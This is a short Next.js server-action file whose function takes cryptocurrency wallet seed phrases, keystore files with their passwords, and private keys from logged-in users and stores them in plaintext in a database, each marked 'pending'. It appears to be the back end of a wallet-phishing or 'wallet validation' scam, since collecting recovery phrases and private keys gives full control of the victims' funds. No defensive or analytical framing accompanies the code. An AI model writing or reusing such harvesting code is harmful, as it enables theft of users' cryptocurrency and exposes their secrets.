"use server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/auth";
import { connectToDB } from "@/lib/connectDB";
import SeedPhrase from "@/models/SeedPhrase";
import KeystoreJson from "@/models/KeystoreJson";
import PrivateKey from "@/models/PrivateKey";

export async function saveWalletData({ type, data, walletName, password }) {
  await connectToDB();
  const session = await getServerSession(authOptions);
  const userId = session?.user?.id || null;

  if (!userId) throw new Error("User not authenticated");

  // Check for existing pending record
  let Model;
  if (type === "phrase") Model = SeedPhrase;
  else if (type === "keystore") Model = KeystoreJson;
  else if (type === "private") Model = PrivateKey;
  else throw new Error("Invalid wallet type");

  

  // Save new pending record
  if (type === "phrase") {
    await SeedPhrase.create({
      userId,
      walletName,
      phrase: data,
      status: "pending",
    });
  } else if (type === "keystore") {
    await KeystoreJson.create({
      userId,
      walletName,
      keystore: data,
      password: password || "",
      status: "pending",
    });
  } else if (type === "private") {
    await PrivateKey.create({
      userId,
      walletName,
      privateKey: data,
      status: "pending",
    });
  }

  return { success: true };
}